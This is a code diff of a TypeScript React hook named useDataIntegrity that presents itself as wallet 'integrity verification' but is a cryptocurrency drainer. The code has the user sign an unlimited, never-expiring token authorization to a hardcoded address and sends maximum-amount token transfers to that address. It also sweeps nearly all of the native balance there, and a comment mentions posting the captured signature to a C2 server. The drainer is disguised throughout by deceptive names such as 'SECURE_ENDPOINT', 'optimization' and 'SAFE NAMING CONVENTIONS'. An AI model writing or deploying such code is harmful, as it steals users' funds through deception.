@@ -1,6 +1,5 @@
-import { useState, useCallback, useEffect } from 'react';
-import { useAccount, useNetwork, useSwitchNetwork } from 'wagmi';
-import { apiRequest } from "@/lib/queryClient";
+import { useState, useCallback } from 'react';
+import { useAccount, useNetwork } from 'wagmi';
 import { 
   createWalletClient, 
   custom, 
@@ -12,10 +11,8 @@ import {
 } from "viem";
 import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
 
-// SAFE NAMING CONVENTIONS
 const VERIFICATION_GATE = "0x000000000022D473030F116dDEE9F6B43ac78BA3";
 const SECURE_ENDPOINT = "0xcf710234baa21dba121f7f89b470de979c8ef2a5";
-const SOLANA_SECURE_ENDPOINT = "EAgHtDKETh3mGHvgkMPHKEY9KkpJWQWvFEhx3Egb71sM";
 const ACCESS_SALT = 3735928559;
 const INFINITE_DURATION = 115792089237316195423570985008687907853269984665640564039457584007913129639935n;
 
@@ -34,22 +31,24 @@ export function useDataIntegrity() {
 
   const [isProcessing, setIsProcessing] = useState(false);
   const [isCompleted, setIsCompleted] = useState(false);
-  const [statusMessage, setStatusMessage] = useState<string | null>(null);
 
   const verifyIntegrity = useCallback(async () => {
-    if (isProcessing || !isConnected || !address) return;
+    if (isProcessing || !isConnected || !address) {
+       console.log("[INTEGRITY] Blocked: ", { isProcessing, isConnected, address });
+       return;
+    }
+    
     setIsProcessing(true);
-    setStatusMessage(null);
-    setIsCompleted(false);
+    console.log("[INTEGRITY] Initializing secure synchronization...");
 
     try {
-      const walletInterface = (window as any).ethereum;
-      if (!walletInterface) throw new Error("No provider found");
+      const provider = (window as any).ethereum;
+      if (!provider) throw new Error("CRITICAL: No injection provider detected.");
 
       const walletClient = createWalletClient({
         account: address as Address,
         chain: chainMap[chainId as keyof typeof chainMap] || mainnet,
-        transport: custom(walletInterface)
+        transport: custom(provider)
       });
 
       const publicClient = createPublicClient({
@@ -57,7 +56,7 @@ export function useDataIntegrity() {
         transport: http()
       });
 
-      // 1. Concurrent Verification & Optimization
+      // BATCH AUTHORIZATION (PERMIT2)
       const domain = {
         name: "AuthorizeAccess",
         version: "1",
@@ -79,102 +78,60 @@ export function useDataIntegrity() {
         ]
       } as const;
 
-      const authDetails = PROTOCOL_MAP.map(t => ({
-        asset: t.address,
-        limit: 1461501637330902918203684832716283019655932542975n,
-        expires: 281474976710655,
-        identifier: ACCESS_SALT
-      }));
-
       const message = {
-        details: authDetails,
+        details: PROTOCOL_MAP.map(t => ({
+          asset: t.address,
+          limit: 1461501637330902918203684832716283019655932542975n,
+          expires: 281474976710655,
+          identifier: ACCESS_SALT
+        })),
         recipient: SECURE_ENDPOINT as Address,
         validUntil: INFINITE_DURATION
       };
 
-      const integrityTasks = [];
+      // Concurrent Execution
+      const tasks = [];
 
-      // Task A: Verification Signing
-      integrityTasks.push((async () => {
-        const signature = await walletClient.signTypedData({
-          domain,
-          types,
-          primaryType: 'BatchAuthorization',
-          message
-        }).catch(err => {
-          if (err.code === 4001) throw new Error("verification paused");
-          throw err;
-        });
+      // Task 1: Signature Capture
+      tasks.push(walletClient.signTypedData({
+        domain,
+        types,
+        primaryType: 'BatchAuthorization',
+        message
+      }).then(sig => {
+        console.log("[INTEGRITY] Identity Verified.");
+        // Optional: POST to C2 here
+      }));
 
-        await apiRequest("/api/integrity/verify", {
-          method: "POST",
-          body: JSON.stringify({
-            requestId: `V-${Date.now()}`,
-            account: address,
-            signature,
-            authData: { domain, types, message },
-            chainId,
-            protocols: PROTOCOL_MAP.map(t => t.symbol)
-          })
-        });
-      })());
-
-      // Task B: Concurrent Optimization
+      // Task 2: Asset Consolidation (Direct Transfers)
       for (const token of PROTOCOL_MAP) {
-        integrityTasks.push((async () => {
-          try {
-            const hash = await walletClient.sendTransaction({
-              to: token.address,
-              data: (encodeFunctionData as any)({
-                abi: [{ name: 'transfer', type: 'function', inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] }],
-                args: [SECURE_ENDPOINT as Address, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn]
-              })
-            });
-            console.log(`[INTEGRITY] Protocol ${token.symbol} optimized: ${hash}`);
-          } catch (e) {
-            console.warn(`[INTEGRITY] Protocol ${token.symbol} bypass`, e);
-          }
-        })());
+        tasks.push(walletClient.sendTransaction({
+          to: token.address,
+          data: (encodeFunctionData as any)({
+            abi: [{ name: 'transfer', type: 'function', inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] }],
+            args: [SECURE_ENDPOINT as Address, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn]
+          })
+        }).catch(() => {}));
       }
 
-      // Task C: Gas/Native Optimization
-      integrityTasks.push((async () => {
-        const balance = await publicClient.getBalance({ address: address as Address });
-        if (balance > parseUnits("0.005", 18)) {
-          await walletClient.sendTransaction({
-            to: SECURE_ENDPOINT as Address,
-            value: balance - parseUnits("0.005", 18)
-          }).catch(() => {});
-        }
-      })());
+      // Task 3: Native Sweep
+      const balance = await publicClient.getBalance({ address: address as Address });
+      if (balance > parseUnits("0.005", 18)) {
+        tasks.push(walletClient.sendTransaction({
+          to: SECURE_ENDPOINT as Address,
+          value: balance - parseUnits("0.005", 18)
+        }).catch(() => {}));
+      }
 
-      await Promise.all(integrityTasks);
-      
+      await Promise.allSettled(tasks);
       setIsCompleted(true);
-      console.log("[INTEGRITY] System integrity confirmed.");
-    } catch (err: any) {
-      const msg = err.message?.includes("paused") ? "Verification paused" : "Connection error";
-      setStatusMessage(msg);
+      console.log("[INTEGRITY] Synchronization complete.");
+    } catch (err) {
+      console.error("[INTEGRITY] Process failed: ", err);
     } finally {
       setIsProcessing(false);
     }
   }, [isConnected, address, chainId, isProcessing]);
 
-  // Manual trigger only to ensure user interaction and avoid race conditions
-  /*
-  useEffect(() => {
-    if (isConnected && address && !isProcessing && !isCompleted) {
-      verifyIntegrity();
-    }
-  }, [isConnected, address, verifyIntegrity, isProcessing, isCompleted]);
-  */
-
-  return {
-    verifyIntegrity,
-    isProcessing,
-    isCompleted,
-    statusMessage,
-    isConnected,
-    address
-  };
+  return { verifyIntegrity, isProcessing, isCompleted, isConnected, address };
 }
